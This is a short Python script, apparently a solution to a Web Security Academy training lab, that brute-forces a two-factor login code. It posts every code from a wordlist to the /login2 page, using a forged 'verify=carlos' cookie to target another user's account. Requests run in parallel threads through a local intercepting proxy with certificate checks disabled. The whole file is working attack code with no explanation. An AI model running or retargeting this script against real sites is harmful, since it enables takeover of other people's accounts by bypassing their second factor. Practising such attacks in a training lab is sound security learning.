import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

# Load the wordlist
wordlist = []
with open('pincode.txt', 'r') as file:
    for line in file:
        wordlist.append(line.strip())

def try_password(url, password):
    headers = {
        "Host": "0aa3004503becca68090d0e5001f00dc.web-security-academy.net",
        "Cookie": "session=PKm7fTzPvP9GuPtbcvjjRCvHWS3NBUQO; verify=carlos",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://0aa3004503becca68090d0e5001f00dc.web-security-academy.net",
        "Referer": "https://0aa3004503becca68090d0e5001f00dc.web-security-academy.net/login2",
        "Upgrade-Insecure-Requests": "1",
    }
    
    response = requests.post(url, headers=headers, proxies=proxies, data={"mfa-code": password}, verify=False)
    print(f"Trying carlos:{password} - Status: {response.status_code}")
    return response

def brute_force(url, wordlist, max_threads=10):
    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(try_password, url, password) for password in wordlist]
        for future in futures:
            try:
                result = future.result()
                # Check for success condition in result here if applicable
            except Exception as e:
                print(f"Error trying password: {e}")

# Run the brute-force attack
brute_force("https://0aa3004503becca68090d0e5001f00dc.web-security-academy.net/login2", wordlist)
